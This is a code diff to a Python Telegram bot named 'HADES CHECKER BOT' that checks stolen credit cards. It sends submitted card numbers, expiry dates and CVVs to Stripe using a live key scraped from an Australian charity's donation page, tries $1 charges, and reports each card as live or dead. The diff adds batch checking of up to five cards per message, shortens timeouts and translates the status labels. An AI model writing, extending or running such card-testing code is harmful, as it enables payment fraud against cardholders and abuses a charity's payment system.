@@ -4,10 +4,7 @@ import requests
 import re
 from flask import Flask, request
 
-# Token ကို ဖွက်ထားပြီး Vercel Environment Variables မှတဆင့်သာ ယူပါမည်
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-
-# Vercel တွင် အလုပ်လုပ်ရန် threaded=False ထည့်ထားရမည်
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=False)
 app = Flask(__name__)
 
@@ -22,7 +19,7 @@ def check_bin(cc):
             bin_data['pais'] = data.get('country', {}).get('name', 'Unknown')
             bin_data['nivel'] = data.get('brand', 'Unknown')
             type_cc = data.get('type', 'Unknown')
-            bin_data['type'] = "Credito" if type_cc == "credit" else "Debito"
+            bin_data['type'] = "Credit" if type_cc == "credit" else "Debit"
     except:
         pass
     return bin_data
@@ -39,7 +36,7 @@ def check_card(cc, mes, ano, cvv):
     token_payload = f"email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F551a9ed)&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&guid=af14a93b-8b72-436b-8e14-90bb703993ea&muid=a0ab5dc8-564e-467a-8633-b87f2b0334cd&sid=ecad1248-6c38-4ddc-8c56-7046debb5c8a&key=pk_live_ENpCAEI7OOkqeDauRnZvxTpX"
 
     try:
-        req_token = requests.post(token_url, headers=token_headers, data=token_payload, timeout=10)
+        req_token = requests.post(token_url, headers=token_headers, data=token_payload, timeout=5)
         token_res = req_token.text
         
         token = ""
@@ -53,39 +50,59 @@ def check_card(cc, mes, ano, cvv):
         }
         donate_payload = '{"amount":"1","plan":null,"frequency":"one-off","currency":"aud","email":"texas1123@gmail.com","token":"' + token + '","description":"Romero Centre - $1 Gift"}'
         
-        req_charge = requests.post(donate_url, headers=donate_headers, data=donate_payload, timeout=10)
+        req_charge = requests.post(donate_url, headers=donate_headers, data=donate_payload, timeout=5)
         charge_res = req_charge.text
 
         if "Your card's security code is incorrect." in charge_res or "Your card's security code is incorrect." in token_res:
-            return f"🟢 <b>#Aprovada (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
+            return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         elif "incorrect_number" in token_res or "Your card number is incorrect." in charge_res:
-            return f"🔴 <b>#Reprovadas (Invalid)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
+            return f"🔴 <b>#Declined (Invalid)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         elif "Your card does not support this type of purchase." in token_res or "Your card does not support this type of purchase." in charge_res:
-            return f"🔴 <b>#Reprovadas (Blocked)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
+            return f"🔴 <b>#Declined (Blocked)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         elif "Your card was declined." in charge_res or "Your card was declined." in token_res:
-            return f"🔴 <b>#Reprovadas (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
+            return f"🔴 <b>#Declined (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         else:
-            return f"🔴 <b>#Reprovadas (Unknown)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
+            return f"🔴 <b>#Declined (Unknown)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
 
     except Exception as e:
-        return f"⚠️ <b>Error Check:</b> {e}"
+        return f"⚠️ <b>Error Check:</b> {cc} - Timeout"
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "⚡️ <b>HADES CHECKER BOT</b> ⚡️\n\nကတ်စစ်ဆေးရန် အောက်ပါအတိုင်း ပို့ပေးပါ။\n<code>cc|mm|yyyy|cvv</code>")
+    bot.reply_to(message, "⚡️ <b>HADES CHECKER BOT</b> ⚡️\n\nကတ်စစ်ဆေးရန် အောက်ပါအတိုင်း ပို့ပေးပါ။ ကတ်(၅)ကတ် တစ်ပြိုင်နက်တည်း စစ်နိုင်ပါသည်။\n<code>cc|mm|yyyy|cvv</code>")
 
 @bot.message_handler(func=lambda message: True)
 def process_message(message):
     text = message.text.strip()
-    match = re.search(r'(\d{15,16})[\|/:;\s]+(\d{1,2})[\|/:;\s]+(\d{2,4})[\|/:;\s]+(\d{3,4})', text)
-    if match:
-        cc, mes, ano, cvv = match.groups()
-        if len(ano) == 2:
-            ano = "20" + ano
+    
+    # re.findall ကိုသုံး၍ ကတ်အများကြီးကို တစ်ပြိုင်နက်တည်း ဖမ်းယူခြင်း
+    matches = re.findall(r'(\d{15,16})[\|/:;\s]+(\d{1,2})[\|/:;\s]+(\d{2,4})[\|/:;\s]+(\d{3,4})', text)
+    
+    if matches:
+        if len(matches) > 5:
+            bot.reply_to(message, "⚠️ <b>Free Hosting Timeout ပြဿနာကြောင့် တစ်ခါစစ်လျှင် အများဆုံး ၅ ကတ်သာ စစ်ပေးမည်ဖြစ်ပါသည်။</b>")
+            matches = matches[:5]
+            
+        msg = bot.reply_to(message, f"⏳ <b>Checking {len(matches)} cards...</b>")
+        final_result = ""
         
-        msg = bot.reply_to(message, "⏳ <b>Checking...</b>")
-        result = check_card(cc, mes, ano, cvv)
-        bot.edit_message_text(result, chat_id=message.chat.id, message_id=msg.message_id)
+        for idx, match in enumerate(matches):
+            cc, mes, ano, cvv = match
+            if len(ano) == 2:
+                ano = "20" + ano
+            
+            res = check_card(cc, mes, ano, cvv)
+            final_result += res + "\n\n"
+            
+            try:
+                bot.edit_message_text(final_result + f"⏳ <i>Checking {idx+1}/{len(matches)}...</i>", chat_id=message.chat.id, message_id=msg.message_id)
+            except:
+                pass
+                
+        try:
+            bot.edit_message_text(final_result + "✅ <b>Check Completed!</b>", chat_id=message.chat.id, message_id=msg.message_id)
+        except:
+            pass
 
 @app.route('/', methods=['GET'])
 def home():
